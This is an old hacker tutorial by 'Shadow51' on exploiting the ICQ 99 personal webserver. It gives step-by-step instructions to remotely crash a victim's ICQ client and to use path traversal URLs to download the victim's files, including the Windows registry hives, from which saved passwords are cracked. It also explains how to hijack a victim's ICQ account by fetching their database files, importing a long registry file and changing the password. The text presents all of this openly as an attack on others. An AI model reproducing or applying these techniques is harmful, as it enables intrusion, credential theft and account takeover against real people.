@@ -1,0 +1,663 @@
+ICQ Homepage Exploit
+By Shadow51
+
+
+Ever wondered why there is a little house beside the name of some people? That doesn't mean they are at home, it means
+they have the ICQ-Webserver running. The idiots who made it left huge bugs in it, like you can close their ICQ remotely,
+and even download their files. The only problem is that you can't see the files, so you have to know what you're
+downloading. 
+
+To close the ICQ client: 
+
+1. Click on the start button 
+2. Click on RUN 
+3. Type Telnet 123.123.123.123 80 Of course replace the 123.123.123.123 by the IP of the victim (note that this bug
+only works on build 1700 and maybe a few others but I'm not sure). 
+4. Press ENTER Wait until it connects 
+5. Type QUIT Wait about 10 seconds. If they go offline that means it worked, if not, then it didn't work. Now suppose
+you want to get some of their files. 
+
+Lets say that you want to see the file c:\windows\win.ini, and he or she has the ICQ-Webserver on: 
+
+1. Go to your browser 
+2. Type http://123.123.123.123/.html/......../windows/win.ini 
+note that you need the /.html/ part. It will trick the server into believing it's a html file, and note that there are 8 dots
+/......../ (that means it goes back 4 dirs if the users ICQ dir is not in a standard place. It can cause problems, but 95% of
+the time it's in c:\progra~1\icq\ 
+3. press ENTER in your browser
+
+It will simply ask you where you want to save the file the you save it and do what ever you want with it. Now this is not all
+you can do. There are much better things with this exploit, like getting the user's password files and registry. If you are a
+lamer, I suggest you go and play with what you just learned, and stop reading now cause this is a bit too complicated for
+you :P. Okay, so you want to have the registry and all the passes. Okay, before you do this, I warn you that if the user
+your hacking is not using the same version of Windows you are using, you could end up with a lot of problems. Suppose
+you have Win98, and they have win95, and it wont work. An easy way to make sure it's the same version is to download
+their command.com with the exploit, and compare the size with your command.com. There are many other ways, but this
+is a good one. 
+
+1. Get 2 files http://123.123.123.123/.html/......../windows/user.dat and
+http://123.123.123.123/.html/......../windows/system.dat 
+Remember to change the IP when your done. 
+2. Copy them in a directory. 
+3. Make a backup copy of you c:\windows\user.dat and c:\windows\system.dat You're gonna want to have them back
+when you're done. 
+4. Restart your computer 
+5. Press F8 just before it boots up 
+6. Choose "Command Prompt Only" 
+7. Delete your current user.dat and system.dat and replace them with the ones from the guy you hacked 
+8. Reboot your computer
+9. Just before it boots, press F8 several times; choose safe mode.
+10. Once booted in safe mode, click on start 
+11. Click on RUN 
+12. Type regedit
+13. Press ENTER
+14. Once in Regedit, click on the menu "Registry", then choose "Export Registry File..."
+15. Save the file, then get yourself a Password Cracker
+16. If all goes well, you now have all the users passwords.
+It should look something like this:
+
+crypt_Blizzard_Storm : A@N
+www.mircosoft.com : Administration:PASSWORD
+*Rna\Dan\dannyk : q34ad6gt
+*Rna\Test\957935 : nar8s7yj
+*Rna\Test2\wolves : cyal8r
+*Rna\Test3\curtisph : q73vnrht
+*Rna\My Connection\USERNAME : PASSWORD
+*Rna\My Connection 3\USERNAME : PASSWORD
+
+17. Reboot
+18. Press F8 at startup
+19. Choose "Command Prompt Only"
+20. Replace user.dat and system.dat with your originals that you previously had backed up
+
+Shadow51 
+29000000 
+Shadow51@writeme.com
+
+-----------------------------------------------------------------------------------------------------------------------
+
+ICQ Account Cracking
+By Shadow51
+
+
+A lot of people have been asking me how it would be possible to crack ICQ accounts. It's very easy, but unfortunately it
+doesn't work every time. All you do is put in this: 
+1. Download the following files from the targeted users hard drive using the ICQ exploit:
+(replace 123.123.123.123 by the guys IP and UIN by the guys ICQ #)
+(note that there's 6 dots not 8)
+
+http://123.123.123.123/.html/....../db/UIN.idx
+http://123.123.123.123/.html/....../db/UIN.dat
+http://123.123.123.123/.html/....../db/UINmsg.dat
+http://123.123.123.123/.html/....../db/UINmsg.idx
+http://123.123.123.123/.html/....../db/UINhis.idx
+http://123.123.123.123/.html/....../db/UINhis.dat
+
+2. Open Notepad and create a new document.
+3. Copy this into it. (Replace all the HACKEDUIN by the UIN you're hacking)
+(I got this registry key from http://i.am/devil)
+
+REGEDIT4
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN]
+"Name"="Hacked UIN"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs]
+"Random Groups Version"=dword:0000000a
+"Online Color"=dword:00ff0000
+"Unlisted Color"=dword:00800000
+"Offline Color"=dword:000000ff
+"Authorize Color"=dword:00400080
+"Notify Color"=dword:00800080
+"LastStatus Color"=dword:00008000
+"Default File Dir"="C:\\Program Files\\ICQ\\Received Files"
+"SMTP Address"=""
+"DND Message"="Please do not disturb me now. Disturb me later."
+"Out Message"=""
+"Busy Message"="User is occupied. Only urgent messages will be delivered."
+"Chat Message"="I would like to chat about anything"
+"Away PreNum"=dword:00000000
+"Out PreNum"=dword:00000000
+"Busy PreNum"=dword:00000000
+"DND PreNum"=dword:00000000
+"Chat PreNum"=dword:00000000
+"File Options"=dword:00000004
+"URL Options"=dword:00000004
+"Chat Options"=dword:00000004
+"All Options"=dword:0000000e
+"EXT Options"=dword:00000004
+"Startup"="No"
+"Auto Away"="No"
+"Auto Hide Time"=dword:0000001e
+"Auto Hide"="No"
+"Move Server Top"="No"
+"Blink In Tray"="No"
+"Sort Lists"="Yes"
+"Show Online List"="No"
+"Remove AddFriend"="Yes"
+"Splash Open"="Yes"
+"History Last First"="Yes"
+"FloatTop"="Yes"
+"Thru Server"="No"
+"Join Chat"="No"
+"Open URL Browser"="No"
+"Refuse File NotInList"="No"
+"Overwrite ExistFile"="No"
+"Disable Online Alert"="Yes"
+"Accept Urgent In Busy"="No"
+"Blink Tray In AwayBusy"="Yes"
+"Use Contact List Color"="No"
+"Contact List Color"=dword:00c8b99d
+"Save User File"="Yes"
+"Auto Update"="Yes"
+"Search Wizard"="No"
+"Default Mailer"="Yes"
+"Pop Play Sound"="Yes"
+"Pop Auto Launch"="No"
+"Pop Check"="No"
+"Pop Time"=dword:0000000a
+"Check Headers"="Yes"
+"MoveToOutDelay"=dword:00000014
+"MoveToOut"="No"
+"MoveToAwayDelay"=dword:0000000a
+"MoveToAway"="No"
+"Auto Sleep Mode"="No"
+"Log History Events"="Yes"
+"Connection Type"="Permanent"
+"Firewall"="Yes"
+"UseGivenIP"="No"
+"Socks"="No"
+"SocksPort"=dword:00000438
+"SocksServer"="Enter your socks server"
+"ProxySocks4Host"="Enter your proxy server"
+"ProxySocks4Port"=dword:00000438
+"UseProxySocks4"="No"
+"GiveStats"="No"
+"SocksVersion"=dword:00000004
+"SocksAuthentication"=dword:00000000
+"FirewallTimeout"=dword:0000001e
+"UseFirewallTimeout"="No"
+"UseFirewallRangePorts"="Yes"
+"FirewallFromPort"=dword:000059d8
+"FirewallToPort"=dword:00007148
+"Old Sockets"="No"
+"UserType"=dword:00000000
+"Mail Receipients"=";"
+"Random Available"="No"
+"RandomGroupName"=dword:00000001
+"Random Name"="#¥d¶³ 666 £["
+"Allow Secure Clients Only"="Yes"
+"PhoneApproval"="Yes"
+"PhoneToneTime"=dword:00000032
+"PhonePauseTime"=dword:000001f4
+"PhoneBreakTime"=dword:00000028
+"PhoneSettings"=dword:00000001
+"PhonePauseChar"=","
+"PhoneLocalP"=" "
+"PhoneLongP"=" "
+"PhoneInterP"=" "
+"Chat RoomName"="Product Support / Suggestion"
+"Auto Join Chat Room"="Yes"
+"Novice Counter"=dword:0000000a
+"Menu Counter"=dword:00000013
+"Servers Version"=dword:00000001
+"Externals Version"=dword:00000019
+"Stats"=hex:60,ff,ea,52,5c,36,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
+00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
+00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
+00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
+00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
+00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
+00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
+00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
+00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"Novice"="No"
+"Dropped Users"=hex:01,00,00,00,43,ca,35,00,e6,02,1f,00
+"State Flags"=dword:00000000
+"Server Msg Version"=dword:0000000b
+"Server Msg Shown"=dword:00000001
+"Server Msg Count"=dword:00000009
+"LeftButton Warning"="No"
+"Menu Left Click"="No"
+"Tip Startup"="No"
+"Tip Position"=dword:00000000
+"MoreEvents Warning"="No"
+"Invisible Warning"="No"
+"Send Later Warning Off"="No"
+"Busy Warning"="No"
+"Away Warning"="No"
+"DND Warning"="No"
+"FT Warning"="No"
+"Ext Warning"="No"
+"Out Warning"="No"
+"Chat Warning"="No"
+"Away Message"="User is currently away\r\nYou can leave him/her a message"
+"Random Comment"="You won't be hurt by things you don't care.\r\n\r\n(c) Calvin's Labs, 1993-1998. No Rights
+Reserved.\r\nIt's not a secret. It's not a magic. It's not a myth."
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\YOURUIN\Prefs\Presets]
+"OutMsg Presets 0"="I'm out'a here. See you tomorrow!"
+"DNDMsg Presets 0"="Please do not disturb me now. Disturb me later."
+"Away PresetsMsg 0"="Away"
+"Out PresetsMsg 0"="Out for the day"
+"Busy PresetsMsg 0"="Busy"
+"DND PresetsMsg 0"="DND"
+"Chat PresetsMsg 0"="Chat"
+"AwayMsg Presets 1"="I am out to lunch. I will return shortly."
+"OutMsg Presets 1"=""
+"DNDMsg Presets 1"="I am currently in a meeting. I can't be disturbed."
+"ChatMsg Presets 1"="Come Join my chat room!"
+"Away PresetsMsg 1"="Lunch"
+"Out PresetsMsg 1"="Not here"
+"Busy PresetsMsg 1"="Meeting"
+"DND PresetsMsg 1"="Meeting"
+"Chat PresetsMsg 1"="Come In"
+"AwayMsg Presets 2"="Don't go anywhere! I'll be back in a jiffy!"
+"OutMsg Presets 2"="I'm closed for the weekend/holidays."
+"DNDMsg Presets 2"="Don't disturb my concentration!"
+"ChatMsg Presets 2"="Don't miss out on the fun! Join our chat!"
+"Away PresetsMsg 2"="Be right back"
+"Out PresetsMsg 2"="Closed"
+"Busy PresetsMsg 2"="Concentration"
+"DND PresetsMsg 2"="Concentration"
+"Chat PresetsMsg 2"="Fun"
+"AwayMsg Presets 3"="I'm out with the dog. Be back when he's finished."
+"OutMsg Presets 3"="Gone fishin'."
+"DNDMsg Presets 3"="I'm on the phone with a very important client. Don't disturb me!"
+"ChatMsg Presets 3"="What are you waiting for? Come on in!"
+"Away PresetsMsg 3"="Dog Walk"
+"Out PresetsMsg 3"="Fishing"
+"Busy PresetsMsg 3"="On the Phone"
+"DND PresetsMsg 3"="On the Phone"
+"Chat PresetsMsg 3"="Don't Wait"
+"AwayMsg Presets 4"="Went out for a smoke. "
+"OutMsg Presets 4"="I'm sleeping. Don't wake me."
+"DNDMsg Presets 4"="I can't chat with you now. I'm busy."
+"ChatMsg Presets 4"="We'd love to hear what you have to say. Join our chat."
+"Away PresetsMsg 4"="Smoke"
+"Out PresetsMsg 4"="Sleeping"
+"Busy PresetsMsg 4"="Can't chat "
+"DND PresetsMsg 4"="Can't chat "
+"Chat PresetsMsg 4"="Hear"
+"AwayMsg Presets 5"="On my Coffee break."
+"OutMsg Presets 5"="Went home. Had to feed the kids."
+"DNDMsg Presets 5"="Can't you see I'm working?"
+"ChatMsg Presets 5"="Enter your chat room message here"
+"Away PresetsMsg 5"="Coffee"
+"Out PresetsMsg 5"="Kids"
+"Busy PresetsMsg 5"="Working"
+"DND PresetsMsg 5"="Working"
+"Chat PresetsMsg 5"="Empty"
+"AwayMsg Presets 6"="Went to get some fresh air."
+"OutMsg Presets 6"="Gone for good."
+"DNDMsg Presets 6"="Enter your occupied message here"
+"ChatMsg Presets 6"="Enter your chat room message here"
+"Away PresetsMsg 6"="Air"
+"Out PresetsMsg 6"="Gone"
+"Busy PresetsMsg 6"="Conversing"
+"DND PresetsMsg 6"="Empty"
+"Chat PresetsMsg 6"="Empty"
+"BusyMsg Presets 7"="User is occupied. Only urgent messages will be delivered."
+"DNDMsg Presets 7"="Enter your occupied message here"
+"ChatMsg Presets 7"="Enter your chat room message here"
+"Away PresetsMsg 7"="Empty"
+"Out PresetsMsg 7"="Empty"
+"Busy PresetsMsg 7"="Empty"
+"DND PresetsMsg 7"="Empty"
+"Chat PresetsMsg 7"="Empty"
+"BusyMsg Presets 0"="User is currently Occupied"
+"ChatMsg Presets 0"="I would like to chat about anything"
+"BusyMsg Presets 1"="User is currently Occupied1"
+"BusyMsg Presets 2"="User is currently Occupied2"
+"BusyMsg Presets 3"="User is currently Occupied"
+"BusyMsg Presets 4"="User is currently Occupied"
+"BusyMsg Presets 5"="User is currently Occupied"
+"BusyMsg Presets 6"="User is currently Occupied"
+"AwayMsg Presets 7"="User is currently away"
+"OutMsg Presets 7"="User is currently N/A"
+"AwayMsg Presets 0"="User is currently away\r\nYou can leave him/her a message"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD]
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD\Message0]
+"Message"="Please bookmark our network status page."
+"URLName"="http://www.mirabilis.com/status.html"
+"URL"="press here"
+"Date"=""
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD\Message1]
+"URLName"="http://www.mirabilis.com/emailsig.html"
+"URL"="Go to the ICQ e-mail signature generator"
+"Date"=""
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD\Message2]
+"Message"="ICQ is doing it again! One more new service from ICQ for your pleasure! Create your ICQ interest group -
+home, work, family, hobby, affiliation, sports, music...etc..( It's straight forward, no HTML needed! )"
+"URLName"="http://www.icq.com/announcements/02.html"
+"URL"="It's fun and easy, GO!!"
+"Date"="31-MAR-98"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD\Message3]
+"URLName"="http://www.icq.com/announcements/whitepages.html"
+"URL"="Go!"
+"Date"="1-APR-98"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD\Message4]
+"Message"="ICQ can notify you when you receive an e-mail and show you the e-mail headers! Learn how to do it!"
+"URLName"="http://www.mirabilis.com/email.html"
+"URL"="E-mail notification instructions"
+"Date"="15-JUN-98"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD\Message5]
+"URLName"="http://www.icq.com/announcements/05.html"
+"URL"="Create your Greeting"
+"Date"="12-JUL-98"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD\Message6]
+"URLName"="http://www.icq.com/announcements/06.html"
+"URL"="Click For More Information"
+"Date"="26-AUG-98"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD\Message7]
+"Message"="ICQ can alert you when you receive Emails and show you the Email headers!"
+"URLName"="http://www.icq.com/announcements/07.html"
+"URL"="Learn how to do it"
+"Date"="06-SEPT-98"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\MOTD\Message8]
+"URLName"="http://www.icq.com/announcements/06.html"
+"URL"="Click For More Information"
+"Date"="20-OCT-98"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\RandomGroups]
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\RandomGroups\RandomGroup1]
+"Name"="General Chat"
+"Number"=dword:00000001
+"Version"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\RandomGroups\RandomGroup2]
+"Name"="Romance"
+"Number"=dword:00000002
+"Version"=dword:00000002
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\RandomGroups\RandomGroup3]
+"Name"="Games"
+"Number"=dword:00000003
+"Version"=dword:00000003
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\RandomGroups\RandomGroup4]
+"Name"="Students"
+"Number"=dword:00000004
+"Version"=dword:00000004
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\RandomGroups\RandomGroup5]
+"Name"="20 Something"
+"Number"=dword:00000006
+"Version"=dword:00000006
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\RandomGroups\RandomGroup6]
+"Name"="30 Something"
+"Number"=dword:00000007
+"Version"=dword:00000007
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\RandomGroups\RandomGroup7]
+"Name"="40 Something"
+"Number"=dword:00000008
+"Version"=dword:00000008
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\RandomGroups\RandomGroup8]
+"Name"="50 Plus"
+"Number"=dword:00000009
+"Version"=dword:00000009
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Servers]
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Servers\Server1]
+"Host"="icq1.mirabilis.com"
+"Port"=dword:00000fa0
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals]
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\Canasta]
+"Type"="Command"
+"Command Line"="/ip:"
+"Path"="C:\\Program Files\\Canasta\\Canasta.exe"
+"URL"="http://ourworld.compuserve.com/homepages/mharte"
+"Version"=dword:0000000f
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\Connectix VideoPhone]
+"Type"="Extension"
+"Format"="/p:tcp /ac:"
+"Extension"="cvp"
+"URL"="http://www.connectix.com/html/videophone.html"
+"Version"=dword:00000009
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\Cu-Seeme]
+"Type"="Command"
+"Command Line"=""
+"Path"="C:\\CUSEEME\\CUSEEM32.EXE"
+"URL"="http://www.cu-seeme.com/"
+"Version"=dword:00000006
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\IRIS Phone]
+"Type"="Extension"
+"Format"=""
+"Extension"="iru"
+"URL"="http://irisphone.com/"
+"Version"=dword:0000000a
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\Microsoft VChat]
+"Type"="ServerExtension"
+"Format"="1.1\\n-u 1 -a "
+"Extension"="vce"
+"NumParameters"=dword:00000002
+"Server1"="vchat1.microsoft.com"
+"URL"="http://vchat1.microsoft.com"
+"Version"=dword:00000011
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\Microsoft VChat\Param1]
+"ParamName"="World"
+"CanOtherChange"="No"
+"Param1"="#Compass"
+"Param2"="#BugWorld"
+"Param3"="#Fishbowl"
+"Param4"="#Lodge"
+"Param5"="#Lunar"
+"Param6"="#Lodge"
+"Param7"="#Practice"
+"Param8"="#RedDen"
+"Param9"="#TableTop"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\Microsoft VChat\Param2]
+"ParamName"="Avatar"
+"CanOtherChange"="Yes"
+"Param1"="Amani"
+"Param2"="Anderson"
+"Param3"="Brb"
+"Param4"="Cat"
+"Param5"="Crab"
+"Param6"="Dancer"
+"Param7"="Dred"
+"Param8"="Duggan"
+"Param9"="Joey"
+"Param10"="Lulu"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\Netscape CoolTalk]
+"Type"="Command"
+"Command Line"=""
+"Path"="C:\\Program Files\\Netscape\\Navigator\\CoolTalk\\CoolTalk.EXE"
+"URL"="http://home.netscape.com/comprod/products/navigator/version_3.0/communication/cooltalk/index.html"
+"Version"=dword:00000004
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\Rikken on the Rockx]
+"Type"="ClientServer"
+"Client Command Line"="/CLIENT %i"
+"Server Command Line"="/SERVER"
+"Client Path"="C:\\Rikken\\Rikken.exe"
+"Server Path"="C:\\Rikken\\Rikken.exe"
+"URL"="http://www.dse.nl/~ramon/rikken/"
+"Version"=dword:00000017
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\VDOPhone]
+"Type"="Extension"
+"Format"="callto://"
+"Extension"="vdp"
+"URL"="http://www.vdo.net/download/"
+"Version"=dword:00000003
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\VidCall]
+"Type"="Command"
+"Command Line"=""
+"Path"="C:\\VidCall\\Corp.EXE"
+"URL"="http://www.access.digex.net/~vidcall/vidcall.html"
+"Version"=dword:00000008
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\WebPhone]
+"Type"="Extension"
+"Format"=""
+"Extension"="wpc"
+"URL"="http://www.webphone.com/"
+"Version"=dword:00000007
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\Quake]
+"Type"="ClientServer"
+"Client Command Line"="-mpath +connect %i"
+"Server Command Line"="-mpath -listen"
+"Client Path"="c:\\quake_sw\\Q95.bat"
+"Server Path"="c:\\quake_sw\\Q95.bat"
+"Server1"="quake.xmisson.com"
+"URL"="http://www.idsoftware.com"
+"Version"=dword:00000010
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\VoxChat]
+"Type"="ServerCommand"
+"Format"="GROUPNAME=i PORT=15000"
+"Path"="C:\\Program Files\\VoxChat\\VoxChat.exe"
+"NumParameters"=dword:00000001
+"Server1"="voxchat1.voxware.com"
+"Server2"="voxcha2.voxware.com"
+"URL"="http://www.voxchat.com/low/download.htm"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\Externals\VoxChat\Param1]
+"ParamName"="Room"
+"CanOtherChange"="No"
+"Param1"="#ICQ"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Prefs\PhoneLocations]
+"LastUpdate"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Main]
+"SelectedCell"=dword:00000000
+"AlwaysOnTop"="Yes"
+"LeftBarWidth"=dword:000000ad
+"RightBarWidth"=dword:000000ad
+"FloatBar-Left"=dword:00000255
+"FloatBar-Right"=dword:00000307
+"FloatBar-Top"=dword:00000033
+"FloatBar-Bottom"=dword:000001f3
+"State"="Floating"
+"Minimized"="No"
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Windows]
+"Response"=dword:008f00c9
+"SearchWiz"=dword:006f00c0
+"NotifyWiz"=dword:006f00c0
+"posNovice"=dword:009300dc
+"posMOTD"=dword:00af00b7
+"posMenuConfig"=dword:00a900e7
+"RemoveUIN"=dword:00bb0108
+"Message"=dword:008b004f
+"Security"=dword:007400b4
+"Prefs"=dword:007f00ae
+"History"=dword:0096003a
+"File Request"=dword:009000f0
+"FileTransfer"=dword:009700ae
+"Info"=dword:009300d2
+"FetchUser"=dword:00e9010e
+"URL Message"=dword:00a00069
+"Away"=dword:00bd00f7
+"Chat Request"=dword:009f00dd
+"Contacts List"=dword:008300bd
+"Chat"=dword:008b00f5
+"Phone"=dword:000a000a
+"Phone Call Request"=dword:007700e5
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\Search]
+"Place"=dword:00a400cc
+"Type"=dword:00000002
+"Width"=dword:01880188
+
+[HKEY_CURRENT_USER\Software\Mirabilis\ICQ\Owners\HACKEDUIN\ICQ Chat]
+"ChatStyle Counter"=dword:00000003
+"Pen Color"=dword:0080ffff
+"Back Color"=dword:00004000
+"Send Focus"="Yes"
+"Enable Sounds"="Yes"
+"Name Bars"="Yes"
+"Always On Top"="No"
+"AutoColor"="No"
+"OverRide Format"="Yes"
+"Show Toolbar"="Yes"
+"State"=dword:00010000
+"New Font Name"="Times New Roman"
+"Char Set"=dword:00000000
+"IRCListWidth"=dword:00000006
+"Font Pitch"=dword:00000012
+"New Font Height"=dword:0000000e
+"Font Effects"=dword:00000000
+"AutoColor 0"=dword:00000000
+"AutoColor 1"=dword:00000080
+"AutoColor 2"=dword:00008000
+"AutoColor 3"=dword:00008080
+"AutoColor 4"=dword:00800000
+"AutoColor 5"=dword:00800080
+"AutoColor 6"=dword:00808000
+"AutoColor 7"=dword:00808080
+"AutoColor 8"=dword:00c0c0c0
+"AutoColor 9"=dword:000000ff
+"AutoColor 10"=dword:0000ff00
+"AutoColor 11"=dword:0000ffff
+"AutoColor 12"=dword:00ff0000
+"AutoColor 13"=dword:00ff00ff
+"AutoColor 14"=dword:00ffff00
+"AutoColor 15"=dword:00ffffff
+"Place-Left"=dword:0000000a
+"Place-Right"=dword:000001fe
+"Place-Top"=dword:0000000a
+"Place-Bottom"=dword:0000021a
+"New LogFile name"="ICQChatLog.txt"
+"New SaveFile name"="ICQChatSave.txt"
+
+4. Save the file as HACKEDICQ.REG
+5. If you have ICQ open, close it.
+6. Copy all the files you got earlier (the idx and dat files) into your ICQ\DB directory 
+ex: c:\progra~1\ICQ\db
+7. Open the HACKEDICQ.REG file
+8. When it asks if you would like to add this to your registry, click YES.
+9. Open the DB convert program in your ICQ directory (It comes with ICQ99), then click on "Convert a old DB"
+10. When it's done converting, close the DB converter. It should start ICQ automatically, but if it doesn't, open it
+manually.
+11. If ICQ doesn't already start in the Hacked UIN, click on the ICQ menu, click on "Add/Change Current User", then
+click on "Change the Active User". Choose Hacked UIN. If it asks for the password, there's 2 things that may have
+happened:
+
+I. They have the protection set on high. The only way of getting past the protection is to download the ICQ CRACK.
+II. They are sill online. The only thing you can do is wait until they go offline.
+
+12. Once you are successfully in the users ICQ, quickly change the users password. Once this is complete, you will be in
+total control over the users ICQ account. Mission success.
+
+ICQ Exploit Tips
+-----------------
+
+Remember in the last text I wrote? I told you to download the command.com. There's a better way to find out the
+Windows version, and more info with it, too. Get the file http://123.123.123.123/.html/......../msdos.sys.
+
+I saw in the original ICQ Exploit text that the HTTP server Exploit doesn't work on NT, so i went in NT and i tested it.
+The result was system wasn't exploitable. Hence, if you are running NT, and you want to use the HTTP server; it's 100%
+safe for you to do so.
+
+Shadow51
+29000000
+Shadow51@hackcity.com
